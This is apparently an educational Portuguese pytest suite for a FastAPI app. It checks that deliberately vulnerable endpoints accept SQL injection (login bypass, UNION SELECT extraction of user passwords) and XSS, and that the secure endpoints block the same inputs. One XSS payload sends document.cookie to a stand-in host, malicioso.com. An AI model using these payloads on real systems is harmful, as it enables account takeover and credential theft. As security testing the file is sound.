"""
Suíte de testes ofensivos e defensivos para validação de SQL Injection e XSS.
"""

import pytest
from fastapi.testclient import TestClient
from main import app

cliente = TestClient(app)


# ==============================================================================
# AUDITORIA OFENSIVA: PROVANDO AS VULNERABILIDADES NO ENDPOINT INSEGURO
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_sql_injection():
    """
    Comprova que a rota vulneravel permite burlar a autenticacao
    e logar como administrador sem conhecer a senha.
    """
    # ARRANGE: Payload ofensivo clássico de subversão de cláusula WHERE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT: Disparo da requisição maliciosa
    resposta = cliente.post("/vulneravel/login", json=payload_malicioso)

    # ASSERT: O endpoint vulnerável autentica indevidamente o invasor
    assert resposta.status_code == 200
    dados = resposta.json()
    assert dados["email"] == "admin@hubsolidario.org"
    assert dados["is_admin"] is True


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_union_select():
    """
    Exercício 1 (Ofensivo): Comprova que o endpoint vulnerável de busca permite
    extrair credenciais de usuários da tabela 'usuarios' via UNION SELECT.
    """
    # ARRANGE: Payload de UNION SELECT para extrair credenciais
    payload = "%' UNION SELECT id, email, senha FROM usuarios --"

    # ACT: Disparo da busca vulnerável
    resposta = cliente.get(f"/vulneravel/campanhas/buscar?termo={payload}")

    # ASSERT: Os registros de usuários com senhas são vazados no resultado
    assert resposta.status_code == 200
    conteudo_str = str(resposta.json())
    assert "segredo_admin_123" in conteudo_str
    assert "admin@hubsolidario.org" in conteudo_str


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_xss():
    """
    Comprova que a rota vulneravel aceita tags de script executaveis sem escapar.
    """
    # ARRANGE: Payload malicioso de Cross-Site Scripting
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>fetch('http://malicioso.com?cookie=' + document.cookie)</script>"
    }

    # ACT: Envio do comentário
    resposta = cliente.post("/vulneravel/comentarios", json=payload_xss)

    # ASSERT: O endpoint vulnerável devolveu a tag <script> intacta
    assert resposta.status_code == 200
    assert "<script>" in resposta.json()["conteudo"]


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_xss_com_tag_img_onerror():
    """
    Exercício 2 (Ofensivo): Comprova que o endpoint vulnerável aceita e reflete
    vetores de XSS baseados em atributos HTML de eventos (como <img onerror>),
    mesmo que a palavra 'script' não seja utilizada.
    """
    # ARRANGE: Payload baseado em imagem com evento onerror
    payload_xss = {
        "autor": "Atacante",
        "conteudo": '<img src="invalido.jpg" onerror="alert(\'XSS\')">'
    }

    # ACT: Envio para endpoint vulnerável
    resposta = cliente.post("/vulneravel/comentarios", json=payload_xss)

    # ASSERT: A tag de imagem e o manipulador de evento retornam intactos
    assert resposta.status_code == 200
    assert '<img src="invalido.jpg" onerror="alert(\'XSS\')">' in resposta.json()["conteudo"]


# ==============================================================================
# AUDITORIA DEFENSIVA: COMPROVANDO A EFICÁCIA DA MITIGAÇÃO NO ENDPOINT SEGURO
# ==============================================================================

@pytest.mark.security
def test_endpoint_seguro_deve_bloquear_sql_injection():
    """
    Comprova que a rota segura barra a tentativa de SQL Injection
    retornando status HTTP 401 Unauthorized.
    """
    # ARRANGE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT
    resposta = cliente.post("/seguro/login", json=payload_malicioso)

    # ASSERT
    assert resposta.status_code == 401
    assert resposta.json()["detail"] == "Credenciais invalidas"


@pytest.mark.security
def test_deve_rejeitar_extracao_union_select():
    """
    Exercício 1 (Defensivo): Comprova que a rota segura impede a injeção via UNION SELECT,
    tratando a entrada estritamente como valor literal de busca.
    """
    # ARRANGE: Payload com injeção UNION SELECT
    payload = "%' UNION SELECT id, email, senha FROM usuarios --"

    # ACT: Busca no endpoint seguro
    resposta = cliente.get(f"/seguro/campanhas/buscar?termo={payload}")

    # ASSERT: A resposta deve ser bem-sucedida (200), mas nenhuma senha pode ser vazada
    assert resposta.status_code == 200
    for item in resposta.json():
        assert "segredo_admin_123" not in str(item)


@pytest.mark.security
def test_endpoint_seguro_deve_sanitizar_tags_xss():
    """
    Comprova que a rota segura sanitiza caracteres perigosos,
    convertendo tags executáveis em entidades HTML inofensivas.
    """
    # ARRANGE
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>alert('Ataque XSS')</script>"
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_xss)

    # ASSERT
    assert resposta.status_code == 200
    conteudo_retornado = resposta.json()["conteudo"]
    assert "<script>" not in conteudo_retornado
    assert "&lt;script&gt;" in conteudo_retornado


@pytest.mark.security
def test_endpoint_seguro_deve_sanitizar_xss_em_atributos_onerror():
    """
    Exercício 2 (Defensivo): Comprova que a rota segura sanitiza tags de imagem
    com manipuladores de eventos (onerror), convertendo delimitadores em entidades HTML.
    """
    # ARRANGE: Payload com tag de imagem e evento onerror
    payload_xss = {
        "autor": "Atacante",
        "conteudo": '<img src="invalido.jpg" onerror="alert(\'XSS\')">'
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_xss)

    # ASSERT
    assert resposta.status_code == 200
    conteudo_retornado = resposta.json()["conteudo"]
    assert "<img" not in conteudo_retornado
    assert "&lt;img" in conteudo_retornado
    assert "onerror" in conteudo_retornado